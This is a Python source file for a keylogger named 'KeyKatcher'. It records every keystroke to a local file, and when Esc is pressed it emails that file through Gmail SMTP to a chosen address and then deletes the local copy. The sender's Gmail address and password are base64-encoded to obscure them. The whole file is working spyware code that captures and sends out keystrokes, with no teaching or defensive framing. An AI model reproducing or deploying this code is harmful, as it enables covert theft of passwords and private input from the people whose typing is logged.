from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage
import os
import base64 

def sendEmail(keys_information, receiver_address):
    senders_address =" a2V5a2F0Y2hlcnIxMjNAZ21haWwuY29t"
    senders_address1 = senders_address.encode("ascii")
    senders_address2 = base64.b64decode(senders_address1)
    senders_address3 = senders_address2.decode("ascii") 
    sender_pass =" S2V5a2F0Y2hlckAxMjM0"
    sender_pass1 = sender_pass.encode("ascii")
    sender_pass2 = base64.b64decode(sender_pass1)
    sender_pass3 = sender_pass2.decode("ascii")

    message = EmailMessage()
    message['From'] = senders_address3
    message['Subject'] = 'KeyKatcher File has been attached...'  

    with open(keys_information, "rb") as f:
        file_data = f.read()
        file_name = f.name

    message.add_attachment(file_data, maintype = "application", subtype= "octet-stream", filename=file_name)

    session = smtplib.SMTP_SSL('smtp.gmail.com', 465) 
    session.login(senders_address3, sender_pass3) 

    text = message.as_string()

    session.sendmail(senders_address3, receiver_address, text)
    session.quit()

    print("mail sent")
    os.remove("key_log.txt")

def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            f.write(str(key))
            f.write("\n")
    f.close()

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def on_release(key):
    global receiver_address
    if key == Key.esc:
        sendEmail(keys_information, receiver_address)
        return False

keys_information = "key_log.txt"
count = 0
keys = []

receiver_address = 'Email ID here'

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()